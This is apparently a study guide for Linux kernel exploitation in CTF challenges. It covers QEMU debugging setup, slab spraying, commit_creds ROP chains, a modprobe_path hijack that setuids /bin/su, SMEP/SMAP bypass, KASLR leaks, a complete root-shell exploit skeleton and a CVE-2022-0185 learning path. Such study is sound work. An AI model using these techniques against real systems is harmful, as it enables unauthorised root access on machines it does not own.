# Kernel Pwn (Kernel Pwn)

## Prepare the environment

Typical kernel challenge package:

```text
kernel/
├── bzImage          # Compressed kernel image
├── vmlinux          # Uncompressed kernel with symbols, for gdb
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # Vulnerable driver
├── run.sh           # QEMU startup script
└── (.config)        # Build configuration, optional
```

### Unpack initramfs and change the init script

```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# Or newc format:
# cpio -idm < ../initramfs.cpio

# Change init to get root (for CTF study; real challenges usually setuid 1000)
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# Or comment out the user-switch line

# Repack
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```

### Extract vmlinux (when only bzImage is provided)

```bash
# Use the extract-vmlinux script from the kernel source scripts/ directory
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU startup parameter template

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # Open gdb port 1234
```

Protection mapping for key parameters:

| Parameter | Meaning | Effect on exploitation |
|-----------|---------|------------------------|
| `+smep` | Kernel mode cannot execute user-mode code | Must use ROP. Cannot jump to user-mode shellcode. |
| `+smap` | Kernel mode cannot access user-mode data | The ROP chain cannot be in user mode. Place it in kernel memory (heap spray / msgsnd). |
| `+pku` | Protection Keys | Similar to SMAP |
| `nokaslr` | Disable KASLR | Function addresses are fixed |
| `kaslr` | Enable KASLR | Must leak an address |
| `pti=on` | KPTI (Meltdown fix) | User-mode return needs swapgs_restore_regs_and_return_to_usermode |

### Debugging

```bash
# Terminal 1
./run.sh   # Includes -s

# Terminal 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```

For GEF, use the fork maintained by bata24. It has dedicated pretty-printing for kernel structures.

## Vulnerability type routing

| Vulnerability | Typical source | Exploitation baseline |
|---------------|----------------|-----------------------|
| Kernel stack overflow | Controllable copy_from_user length | Stack canary + KASLR → ROP |
| Kernel heap overflow | Out-of-bounds write in kmalloc slab | Slab spray + overwrite adjacent object |
| UAF | Refcount error / double free | Reallocate the same slab → control the freed object |
| Integer overflow | Size calculation overflow → small allocation, large copy | It is an overflow. Use the same path. |
| TOCTOU | User-mode pointer dereferenced twice | userfaultfd / FUSE to delay execution |
| Race | Two threads call ioctl at once | Hit the timing window |
| Arbitrary read/write | Already an ultimate primitive | Directly modify cred / modprobe_path |

## Slab spray (core kernel heap exploitation)

Spray controllable-size kernel objects into the vulnerable slab and overwrite the target object.

| Slab size | Spray object | Advantage |
|-----------|-------------|-----------|
| kmalloc-64 / 96 | `seq_operations` | Has a function pointer. Overwrite gives IP control. |
| kmalloc-1024 | `tty_struct` | Has an ops pointer and a useful layout. |
| kmalloc-4096 | `pipe_buffer` | Main modern option. Still works in 6.x. |
| Any size | `msg_msg` | Controllable size (8 - 4096+). sysv msgsnd controls the data. |
| kmalloc-128 | `user_key_payload` | keyctl family of interfaces |

### msg_msg spray example

```c
// Trigger from user mode
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // Add the msg_msg header 0x30 = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // Spray into kmalloc-128
// ... trigger the vulnerability and overwrite
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // Read back to check whether it changed → leak
```

## Privilege-escalation paths

### 1. `commit_creds(prepare_kernel_cred(0))` ROP

Classic and general. Prerequisite: control RIP (stack overflow / vtable hijack).

```c
// User-mode ROP chain
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // → return root cred in rax
    pop_rdi,                          // pop rdi; ret
    /* placeholder, overwritten by mov below */ 0,
    /* mov rdi, rax; ... ; ret */ 0,  // Move rax→rdi (some cases need a dedicated gadget)
    commit_creds,                     // Set the current process cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // Skip the push sequence
    0, 0,                             // rax, rdi placeholders
    user_rip,                         // User-mode return function (saved cs/ss)
    user_cs, user_rflags, user_rsp, user_ss,
};
```

**Key gadgets** (find them in vmlinux with ROPgadget):

```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```

Before returning to user mode, save cs/ss/rflags/rsp:

```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```

### 2. Change `modprobe_path` to `/tmp/x` (simplest)

```text
Principle:
  - The kernel global variable modprobe_path defaults to "/sbin/modprobe".
  - When execve receives a file with an unknown magic value, the kernel runs modprobe_path as root.
  - Change it to "/tmp/x", write /tmp/x (chmod +x), and trigger an unknown magic value.
  
Use: When you have an arbitrary-write primitive but cannot reliably use ROP.
```

```c
// 1. Prepare the payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. Prepare the trigger file
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. Use the arbitrary-write primitive: change modprobe_path to "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. Trigger
system("/tmp/trigger");
// The kernel runs /tmp/x as root. It runs chmod +s /bin/su.

// 5. Use setuid
system("/bin/su");
```

**Source of the `modprobe_path` address**: the symbol in vmlinux, or `/proc/kallsyms` when `kptr_restrict=0`.

### 3. `core_pattern` hijack

```text
Similar idea: /proc/sys/kernel/core_pattern controls the coredump handler.
Change it to "|/tmp/x %P" so the process calls it when it crashes.
Limitation: It requires a coredump trigger and is less convenient than modprobe_path.
```

### 4. Kernel ROP to disable SMEP/SMAP

If you need to jump back to user-mode shellcode for study, use ROP to clear bits in cr4:

```c
// CR4: SMEP = bit 20, SMAP = bit 21
// After disabling SMEP+SMAP, jmp to user-mode shellcode can run
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // Expected CR4 value (SMEP/SMAP bits removed)
    mov_cr4_rdi,            // "mov cr4, rdi; pop rbp; ret" or similar
    0,
    user_shellcode_addr,    // Jump there (fails if SMEP is not disabled yet)
};
```

In real exploitation, **this path is rarely used**. Direct `commit_creds` ROP is shorter and more stable.

## KASLR leak channels

| Source | Limitation | Notes |
|--------|------------|-------|
| /proc/kallsyms | Real addresses appear only when `kptr_restrict=0` | Often open in CTFs |
| /sys/module/.../sections/.text | Same as above | Module base |
| dmesg | Readable only when `dmesg_restrict=0` | oops information leaks an address |
| Uninitialized kernel-stack read | The vulnerability must allow arbitrary read | Residual address |
| msg_msg + vulnerability leak | OOB read after spraying | General |
| Side channel (Meltdown/Spectre) | KPTI fixed Meltdown | Not general |
| SIDT/SGDT user-mode instructions | May leak on old kernels | Usually blocked on modern kernels |

```c
// Classic: read from /proc/kallsyms
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // Offset from vmlinux
```

## Complete exploit template (user mode + ioctl trigger + ROP privilege escalation + shell)

```c
// exploit.c — general kernel pwn skeleton
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base (leak first, or hard-code when nokaslr is set) ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

    // 1. Leak the KASLR base (assume /proc/kallsyms is readable, or provide your own leak primitive)
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

    // 2. Build the ROP chain (on the user stack or a sprayed fake stack)
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // Temporary user rsp. It can point above the mmap area.
    rop[i++] = user_ss;

    // 3. Trigger the vulnerability and make kernel RIP jump to rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // Challenge-specific: ioctl / write / read

    return 0;
}
```

## Study reference: CVE-2022-0185

```text
Vulnerability: legacy_parse_param in fs/fs_context.c mixes signed and unsigned length calculations.
              → Heap buffer overflow in kmalloc. Size and data are controllable.

Why it is a useful study sample:
1. No root is needed to trigger it (unprivileged user namespace).
2. The overflow size is fully controllable.
3. A complete writeup + PoC is public.
4. It combines user_ns exploitation, msg_msg spray, UAF reallocation, and cross-cache exploitation.

Learning path:
1. Build a kernel with CONFIG_USER_NS=y.
2. Run the original Crusaders of Rust PoC: https://www.openwall.com/lists/oss-security/2022/01/18/7
3. Read the official willsroot.io writeup (the PortSwigger version).
4. Rewrite it manually: change the msg_msg spray to a pipe_buffer spray to practice another slab path.
5. Add a KASLR leak. The original uses /proc/kallsyms. Disable it in the challenge version and use an OOB read instead.
```

Main techniques and their sections in this document:

- Vulnerability type → "Kernel heap overflow"
- Spray object → "msg_msg spray"
- Privilege-escalation method → "commit_creds ROP" or "modprobe_path"
- KASLR leak → "/proc/kallsyms" or "msg_msg + vulnerability leak"

## Notes

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** randomizes the kernel stack base by 0-1023 on every syscall. It affects every exploit that relies on a fixed stack offset.
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** randomizes object allocation inside the slab. Spray success decreases. Spray more.
- **CONFIG_STATIC_USERMODEHELPER** makes modprobe_path read-only through `static_usermodehelper_path`. The modprobe attack fails.
- **KPTI** separates user-mode and kernel-mode page tables. User-mode return must use the `swapgs_restore_regs_and_return_to_usermode` trampoline. Do not use direct swapgs+iretq.
- **FG-KASLR** (function-granular KASLR) randomizes at function level. Leak multiple symbols to derive each function offset.
- **CET / IBT** (Intel control-flow enforcement) requires indirect jumps to land on an ENDBR instruction. Some gadgets fail.
- **Do not use printk output for tests in the kernel**: serial I/O changes timing and breaks races. Use a magic register value (rcx=0xdeadbeef) and a gdb watch instead.
